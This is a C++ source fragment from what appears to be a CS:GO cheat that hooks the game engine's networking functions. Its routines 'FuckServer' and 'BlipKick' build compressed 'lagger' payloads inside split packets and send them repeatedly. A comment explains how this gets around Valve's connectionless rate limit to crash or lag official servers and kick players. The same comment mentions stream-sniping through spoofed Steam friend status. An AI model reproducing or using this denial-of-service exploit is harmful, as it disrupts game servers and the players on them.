		EncryptBuffer(cipher, (byte*)payload.GetBasePointer(), payload.GetNumBytesWritten());
		msg.WriteLong(payload.GetNumBytesWritten());
	}

	msg.WriteBytes(payload.GetBasePointer(), payload.GetNumBytesWritten());
}
#endif



#if 0
char payloadBuffer[1024];
bf_write payload(payloadBuffer, 1024);
payload.WriteLong(0xfeedbeef); // Magic
payload.WriteLongLong(g_OurServerReservation);
payload.WriteLong(576); //nSettingsSize
while (payload.GetNumBytesWritten() % 8)
{
	payload.WriteByte(0);
}

IceKey cipher(1); /* medium encryption level */
unsigned char ucEncryptionKey[8] = { 0 };
*(int*)&ucEncryptionKey[0] = LittleDWord(memory->clientState->challengeNr ^ 0x5ef8ce12);
*(int*)&ucEncryptionKey[4] = LittleDWord(memory->clientState->challengeNr ^ 0xaa98e42c);
cipher.set(ucEncryptionKey);
EncryptBuffer(cipher, (unsigned char*)payloadBuffer, 1024);

msg.WriteBytes(payloadBuffer, 1024); //PayloadSize
#endif




#include "Hacks/SteamWorks/SteamWorks.h"
char* packetbuf = NULL;


/*

This works because the Connectionless ratelimit in ProcessConnectionless isn't enabled on valve official. Rather they use a ratelimit in
CSteamSocketMgr. BUT since you can send splitpackets (that don't have the 0xFFFFFF header, rather the NET_HEADER_FLAG_SPLITPACKET one),
you aren't limited by this ratelimit. You also won't get kicked for processing time as connectionless packets are not technically bound
to a netchannel. Currently for streamsnipe shit i'm just making ISteamFriends say everyone is a friend and is currently online. But you can
get relays which sucks. If you don't want to get fucked by GOTV Relays, you can just get the server the player is one, start a connection through
ConnectToDedicatedHostedServer or whatever the isteamsockets function is, then spam your splitpacket connectionless packets. I don't feel like implementing
that cause GOTV shit works fine enough for our purposes.

*/
unsigned int __stdcall EngineHooks::FuckServer(void*)
{

	shouldCall = false;
	if (!packetbuf){
		const int size = (MAX_ROUTABLE_PAYLOAD * 10);
		static LZSSLagger2 g_LZSSLagCreator2(size);
		char* Packet;
		int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
		bytes = std::clamp(bytes, 0, size);
		
#ifdef DEV_SECRET_BUILD
		bf_write msg(Packet, size);
		msg.WriteLong(LittleLong((int)CONNECTIONLESS_HEADER));
		//msg.WriteByte(A2A_PING); // 
		msg.WriteByte(C2S_CONNECT);
		msg.WriteLong(memory->HOST_VERSION);
#else // DEBUG
		* (int*)Packet = LittleLong((int)CONNECTIONLESS_HEADER);
		* (unsigned int*)((Packet + sizeof(unsigned int*))) = A2A_PING; // A2A_PING
#endif

		packetbuf = (char*)malloc(size + sizeof(SPLITPACKET));
		EngineHooks::ehQ_memcpy(packetbuf + sizeof(SPLITPACKET), (void*)((uintptr_t)Packet), size);
	}
	SPLITPACKET* to_split = (SPLITPACKET*)packetbuf;

	for (int i = 0; (i < config->mmcrasher.timesToSend) && config->mmcrasher.enabled ; i++) {
		g_bDontProcessConnectionless = true;
		if (GetAsyncKeyState(VK_PAUSE)) {
			//LZSSAttackOnReceiveDatagram(ARGS_KEEP.netchann);
		}
		else {
#ifdef DEV_SECRET_BUILD
			//SendInvalidPacket((NetworkChannel*)ARGS_KEEP.netchann);
			CUSTOM_NET_SendLong(ARGS_KEEP.netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
#else
			CUSTOM_NET_SendLong(ARGS_KEEP.netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
#endif
		}
	}
	//memory->clientState->deltaTick = -1;
	shouldCall = true;
	return 0;
}



char* invalidbuffer = 0;
int encryptedSize = 0;


#include <sstream>
#include <iomanip>
#include <string>
std::string hexStr2(BYTE* data, int len)
{
	std::stringstream ss;
	ss << std::hex;

	for (int i(0); i < len; ++i)
		ss << std::setw(2) << std::setfill('0') << (int)data[i] << " ";

	return ss.str();
}

//#define GO_TO_NETCHAN_PROCESS_HEADER


FORCEINLINE int SendInvalidPacket(NetworkChannel* chan, int size = 576) {


}
unsigned int __stdcall EngineHooks::ProcessPacketsTestCrasher(void*)
{

}

char* blippacketbuf = NULL;
unsigned int __stdcall EngineHooks::BlipKick(void*)
{
	while (true) {
		if (!ClientHooks::g_pNetChannel || ClientHooks::g_pNetChannel != interfaces->engine->getNetworkChannel() || !SentBlipLagPacket)
			continue;


		if (!blippacketbuf) {
			const int size = (MAX_ROUTABLE_PAYLOAD * 10);
			static LZSSLagger2 g_LZSSLagCreator2(size);
			char* Packet;
			int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
			bytes = std::clamp(bytes, 0, size);
#ifdef DEV_SECRET_BUILD
			bf_write msg(Packet, size);
			msg.WriteLong(LittleLong((int)CONNECTIONLESS_HEADER));
			msg.WriteByte(C2S_CONNECT);
#else // DEBUG
			* (int*)Packet = LittleLong((int)CONNECTIONLESS_HEADER);
			*(unsigned int*)((Packet + sizeof(unsigned int*))) = A2A_PING; // A2A_PING
#endif
			blippacketbuf = (char*)malloc(size + sizeof(SPLITPACKET));
			EngineHooks::ehQ_memcpy(blippacketbuf + sizeof(SPLITPACKET), (void*)((uintptr_t)Packet), size);
		}
		SPLITPACKET* to_split = (SPLITPACKET*)blippacketbuf;

		for (int i = 0; (i < 2000); i++) {
			g_bDontProcessConnectionless = true;
			if (GetAsyncKeyState(VK_PAUSE)) {
			}
			else {
#ifdef DEV_SECRET_BUILD
				CUSTOM_NET_SendLong((void*)ClientHooks::g_pNetChannel, (unsigned char*)blippacketbuf + sizeof(SPLITPACKET), 13, 576);
#else
				CUSTOM_NET_SendLong((void*)ClientHooks::g_pNetChannel, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
#endif
			}
		}
		SentBlipLagPacket = false;
	}
}

unsigned int __stdcall EngineHooks::ReduceServerFrameTime(void*)
{

}





NetworkChannel* OurNewNetchannl;
typedef NetworkChannel*(__cdecl* NET_CreateNetChannelFunc)(int socket, const void* adr, const char* name, INetChannelHandler* handler, const std::byte* pbEncryptionKey, bool bForceNewChannel);
NetworkChannel* __cdecl EngineHooks::NET_CreateNetChannel(int socket, const void* adr, const char* name, INetChannelHandler* handler, const std::byte* pbEncryptionKey, bool bForceNewChannel) {
	OurNewNetchannl = ((NET_CreateNetChannelFunc)memory->oNET_CreateNetChannel)(socket, adr, name, handler, pbEncryptionKey, true);
	NetworkChannel* theirs = ((NET_CreateNetChannelFunc)memory->oNET_CreateNetChannel)(socket, adr, name, handler, pbEncryptionKey, true);
	return theirs;
}

char ExtractHeader(DWORD* a3) {
	int v11;
	int v258;
	unsigned int v16; // edx
	int v259; // [esp+10h] [ebp-E20h]
	int v14;
	DWORD* v15;
	bool v10; // zf
	int v306;
	int* v12; // eax
	int v13; // eax
	static int* dword_104C83A8 /*[33]*/ = (int*)memory->findPattern_ex(L"engine", "\x74\x08\x33\xD2\x89\x54\x24\x10\xEB\x38") + 1;

	netpacket_s* v4 = (netpacket_s*)a3;
	DWORD* v5 = (DWORD*)(a3 + 52);
	signed int v6 = *(DWORD*)(a3 + 72);
	int i = *(DWORD*)(a3 + 84);
	unsigned int v7 = *(DWORD*)(a3 + 68);
	long long v8 = *(DWORD*)(a3 + 52);
	long long v9 = *(DWORD*)(a3 + 68);

	if (v6 < 8)
	{
		v259 = *(DWORD*)(a3 + 68);
		v14 = 8 - v6;
		v15 = *(DWORD**)(a3 + 76);
		if (v15 == *(DWORD**)(a3 + 80))
		{
			*(DWORD*)(a3 + 72) = 1;
			*(DWORD*)(a3 + 68) = 0;
			*(BYTE*)(a3 + 56) = 1;
		}
		else
		{
			if ((unsigned int)v15 > *(DWORD*)(a3 + 80))
			{
				*(BYTE*)(a3 + 56) = 1;
				*(DWORD*)(a3 + 68) = 0;
				goto LABEL_15;
			}
			*(DWORD*)(a3 + 68) = *v15;
		}
		*(DWORD*)(a3 + 76) = (DWORD)v15 + 1;
	LABEL_15:
		if (*(BYTE*)(a3 + 56))
		{
			v11 = 0;
			v258 = 0;
		}
		else
		{
			v16 = *(DWORD*)(a3 + 68);
			v258 = ((v16 & dword_104C83A8[v14]) << *(DWORD*)(a3 + 72)) | v259;
			v4 = (netpacket_s*)a3;
			*(DWORD*)(a3 + 68) = v16 >> v14;
			v11 = v258;
			*(DWORD*)(a3 + 72) = 32 - v14;
		}
		goto LABEL_18;
	}
	v10 = *(DWORD*)(a3 + 72) == 8;
	*(DWORD*)(a3 + 72) -= 8;
	v11 = (unsigned __int8)v7;
	v306 = v7;
	v258 = (unsigned __int8)v7;
	if (v10)
	{
		v12 = *(int**)(a3 + 76);
		*(DWORD*)(a3 + 72) = 32;
		if (v12 == *(int**)(a3 + 80))
		{
			*(DWORD*)(a3 + 72) = 1;
			*(DWORD*)(a3 + 68) = 0;
			*(DWORD*)(a3 + 76) = (DWORD)v12 + 1;
		}
		else if ((unsigned int)v12 <= *(DWORD*)(a3 + 80))
		{
			v13 = *v12;
			*(DWORD*)(a3 + 76) += 4;
			*(DWORD*)(a3 + 68) = v13;
		}
		else
		{
			*(BYTE*)(a3 + 56) = 1;
			*(DWORD*)(a3 + 68) = 0;
		}
	}
	else
	{
		*(DWORD*)(a3 + 68) = v7 >> 8;
	}
LABEL_18:
	return v7;

}


typedef bool(__thiscall* ProcessConnectionlessFunc)(void* ecx, netpacket_t* packet);
bool __fastcall EngineHooks::ProcessConnectionless(void* ecx, void* edx, void* pPacket) {

	netpacket_s* packet = (netpacket_s*)pPacket;
	//CON("Process Connectionless Called!!!!!!!!!!!");
#if 0

	char cPacketHeader = NULL;
	if (packet) {
		cPacketHeader = *(char*)(packet + 68); //  ExtractHeader((DWORD*)packet);
		if (cPacketHeader) {
			if (config->debug.PrintConnectionless) {
				Debug::QuickPrint(("CBaseClientState::ProcessConnectionlessPacket Packet Recieved, Header == " + std::to_string(cPacketHeader)).c_str());
			}
		}
		else {
			Debug::QuickPrint("CBaseClientState::ProcessConnectionlessPacket Packet Recieved, Header Is NULL (0)!");
		}
	}
	else {
		Debug::QuickPrint("CBaseClientState::ProcessConnectionlessPacket Recieved nullptr for packet!");
	}

#endif

//#ifndef DEV_SECRET_BUILD
	if (g_bDontProcessConnectionless)
		return true;

//#endif



	return ((ProcessConnectionlessFunc)memory->oProcessConnectionless)(ecx, packet);
}

typedef int(__fastcall* SendDataGramFunc)(NetworkChannel*, bf_write*);
int __fastcall EngineHooks::SendDatagram(NetworkChannel* network, void* edx, bf_write* datagram)
{
	Debug::QuickPrint("SendDatagram");
	return ((SendDataGramFunc)memory->oCNetChan_SendDatagram)(network, datagram);
}

void __fastcall EngineHooks::SetReservationCookie(void* clientstate, void* edx, unsigned long long cookie)
{
	Debug::QuickPrint("SetReservationCookie");
	g_OurServerReservation = cookie;
	std::string Reserve{ "Our Reservation Coookie: " + std::to_string(g_OurServerReservation) };
	Debug::QuickPrint(Reserve.c_str());
	hooks->clientState.callOriginal<void, 63, unsigned long long>(cookie);
	return;
}

#endif


//returns true if we want to actually run the original
// This is a lot cleaner solution to stopping incoming traffic for the teleport. As it buffers everything till we let off.
// Literally fixes nearly all bugs you may have 
// All Credits to Shark for hooking this originally when we were trying to simulate the exploit for desync-disabling 
// testing on Mutiny Server.

bool __stdcall EngineHooks::Hooked_NetReceiveRawPacket(int sock, void* buf, int len, void* from)
{
	if (Timing::ExploitTiming.m_bStopAllDatagramsIn)
		return false;
	return true;
}



/*
	59	CBaseClientState::GetConnectionRetryNumber(void)const
	60	CBaseClientState::GetClientName(void)
	61	CBaseClientState::ReserveServer(ns_address const&,ns_address const&,unsigned long long,KeyValues *,IMatchAsyncOperationCallback *,IMatchAsyncOperation **)
	62	CBaseClientState::HandleReservationResponse(CBaseClientState::ReservationResponseReply_t const&)
	63	CBaseClientState::HandleReserveServerChallengeResponse(int)
	64	CBaseClientState::SetServerReservationCookie(unsigned long long)
*/